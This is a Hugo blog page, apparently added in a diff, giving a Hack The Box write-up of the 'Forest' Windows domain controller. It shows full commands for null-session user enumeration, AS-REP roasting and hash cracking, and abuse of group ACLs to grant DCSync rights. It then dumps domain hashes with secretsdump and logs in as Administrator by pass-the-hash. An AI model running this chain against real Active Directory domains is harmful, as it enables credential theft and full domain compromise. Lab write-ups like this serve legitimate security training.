@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB - Forest :: squ4r00t</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Easy&#39; rated machine: Forest" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/htb-forest/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB - Forest">
+<meta property="og:description" content="Writeup for the &#39;Easy&#39; rated machine: Forest" />
+<meta property="og:url" content="//localhost:1313/posts/htb-forest/" />
+<meta property="og:site_name" content="squ4r00t" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/img/htb/forest/tn.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-11-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &lt; squ4r00t &gt;
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">$ whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/whoami" >$ whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/htb-forest/">HTB - Forest</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-11-16</time><span class="post-author">squ4r00t</span>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+    </span>
+  
+  
+    
+    <img src="//localhost:1313/img/htb/forest/tn.png"
+      class="post-cover"
+      alt=" "
+      title="Cover Image" />
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Forest in an easy difficulty Windows Domain Controller. We are able to enumerate domain users through a NULL session. Once we have our list of users, we notice that there is a service account <code>svc-alfresco</code>, we then decide to check if there are any account with kerberos pre-authentication enabled. We discover that we are able to get the hash for that service account (ASREPRoasting) and easily crack it, thus gaining a foothold in the domain. We then enumerate the domain with bloodhound just to find that this user has some interesting group memberships and privileges eventually allowing us to perform DCSync and get the Administrator NTLM hash which we then use with winrm to gain an Administrator shell.</p>
+<h2 id="nmap-results">Nmap Results<a href="#nmap-results" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain       Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-11-16 21:23:22Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows Server <span class="m">2016</span> Standard <span class="m">14393</span> microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49677/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49681/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49698/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">50033/tcp open  msrpc        Microsoft Windows RPC
+</span></span></code></pre></div><p>From the scan results, we got the domain name (<code>htb.local</code>) as well as the hostname of the machine (<code>FOREST</code>). We can add them to our host file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;10.129.30.97\tFOREST FOREST.htb.local htb.local&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h4 id="user-enumeration">User Enumeration<a href="#user-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<hr>
+<p>First let&rsquo;s see if we can enumerate users with <code>rpcclient</code> by leveraging a SMB null session:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="523874961" type="checkbox"  />
+    <label for="523874961">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">User Enumeration with rpcclient through a NUL session</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+rpcclient -N -U &#34;&#34; 10.129.30.97
+
+rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre>
+  </div>
+
+
+<p>We could have also used <code>netexec</code> for this purpose:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.30.97 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --users
+</span></span></code></pre></div><p>We got back a few users:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">sebastien
+</span></span><span class="line"><span class="cl">lucinda
+</span></span><span class="line"><span class="cl">svc-alfresco
+</span></span><span class="line"><span class="cl">andy
+</span></span><span class="line"><span class="cl">mark
+</span></span><span class="line"><span class="cl">santi
+</span></span></code></pre></div><p>Let&rsquo;s note them somewhere and move on.</p>
+<h4 id="asreproasting">ASREPRoasting<a href="#asreproasting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<hr>
+<p>Now that we have a list of users, we could try multiple things such as password spraying for example, but there are other things we could try first. For instance, let&rsquo;s see if among our list of users account there are some that do not require kerberos pre-authentication:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="635429817" type="checkbox"  />
+    <label for="635429817">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">ASREPRoasting using impacket-GetNPUsers</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+impacket-GetNPUsers htb.local/ -usersfile users -format hashcat -outputfile asrep_hashes.out
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User Administrator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:5f9...&lt;SNIP&gt;...63836d7
+[-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+  </div>
+
+
+<p>As we can see, the service account <code>svc-alfresco</code> does not require kerberos pre-authentication, hence we making it vulnerable to ASREPRoasting.</p>
+<p>More on ASREPRoasting -&gt; <a href="https://www.thehacker.recipes/ad/movement/kerberos/asreproast">https://www.thehacker.recipes/ad/movement/kerberos/asreproast</a></p>
+<p>We can now try to crack it with hashcat:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="672938154" type="checkbox"  />
+    <label for="672938154">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Cracking service ticket</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+  </div>
+
+
+
+  <figure class="center" >
+    <img src="/img/htb/forest/cracked_hash_svcalfresco.png"   />
+    
+      <figcaption class="center" >svc-alfresco password cracked !</figcaption>
+    
+  </figure>
+
+
+<p>Now that we have the password for <code>svc-alfresco</code>, let&rsquo;s try to login via winrm:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="419765382" type="checkbox"  />
+    <label for="419765382">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Login via winrm as svc-alfresco</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+evil-winrm -i 10.129.30.97 -u svc-alfresco -p &lt;PASSWORD&gt;
+</code></pre>
+  </div>
+
+
+<p>We successfully logged in and was able to retrieve the user flag at <code>C:\Users\svc-alfresco\Desktop\user.txt</code></p>
+
+  <figure class="center" >
+    <img src="/img/htb/forest/user_flag.png"   />
+    
+      <figcaption class="center" >User flag obtained !</figcaption>
+    
+  </figure>
+
+
+<h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Now that we have a foothold in the domain, let&rsquo;s use <a href="https://github.com/dirkjanm/BloodHound.py">bloodhound-python</a> in order to collect information about the domain that we can than visualize after:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="235694781" type="checkbox"  />
+    <label for="235694781">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Collecting data for bloodhound</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# Collecting data
+bloodhoud-python -u svc-alfresco -p &lt;PASSWORD&gt; -ns 10.129.30.97 -d htb.local -c all
+# Zipping the json output files
+zip -r data.zip *.json
+</code></pre>
+  </div>
+
+
+<p>Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that <code>svc-alfresco</code>, through nested group memberships, is in the <code>Account Operators</code> group which has <code>GenericAll</code> privilege on the <code>Exchange Windows Permissions</code> group which then have the <code>WriteDacl</code> privilege over the domain object.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/forest/bloodhound.png"   />
+    
+      <figcaption class="center" >Path for privilege escalation</figcaption>
+    
+  </figure>
+
+
+<p>With this information, we can do the following:</p>
+<ul>
+<li>Create a new domain user.</li>
+<li>Add that user to the <code>Exchange Windows Permissions</code> group by abusing our <code>GenericAll</code> privilege.</li>
+<li>As the new user, add <code>DCSync</code> privileges to our self by abusing the <code>WriteDacl</code> privilege.</li>
+<li>Dump all the hashes</li>
+</ul>
+
+
+
+  <div class="collapsable-code">
+    <input id="165824379" type="checkbox"  />
+    <label for="165824379">
+      <span class="collapsable-code__language">powershell</span>
+      <span class="collapsable-code__title">Getting DCSync privilege</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-powershell" ><code>
+# Creating a new domain user (as svc-alfresco)
+net user hackerr password123! /add /domain
+
+# Add &#39;hackerr&#39; to the Exchange Windows Permissions group
+net group &#34;Exchange Windows Permissions&#34; hackerr /add
+
+# Add DCSync privileges with
+$pass = ConvertTo-SecureString &#39;password123!&#39; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&#39;htb.local\hackerr&#39;, $pass)
+Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
+</code></pre>
+  </div>
+
+
+<p>Now <code>hackerr</code> should have DCSync rights. We can verify by using using impacket&rsquo;s secretsdump:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="931752846" type="checkbox"  />
+    <label for="931752846">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">DCSync using impacket-secretsdump</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+impacket-secretsdump htb.local/hackerr:&#39;password123!&#39;@10.129.30.97 -just-dc -outputfile dcsync.out
+</code></pre>
+  </div>
+
+
+
+  <figure class="center" >
+    <img src="/img/htb/forest/dcsync.png"   />
+    
+      <figcaption class="center" >DCSync</figcaption>
+    
+  </figure>
+
+
+<p>We can use the Administrator&rsquo;s NThash to login via <code>winrm</code>:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="172684935" type="checkbox"  />
+    <label for="172684935">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Login via winrm as Administrator</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+evil-winrm -i 10.129.30.97 -u Administrator -H &#39;32693b11e6aa90eb43d32c72a07ceea6&#39;
+</code></pre>
+  </div>
+
+
+<p>We can then retrive the root flag.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/forest/root_flag.png"   />
+    
+      <figcaption class="center" >Root flag obtained !</figcaption>
+    
+  </figure>
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/htb-chemistry/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB - Chemistry</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/htb-permx/">
+                <span class="button__text">HTB - Permx</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
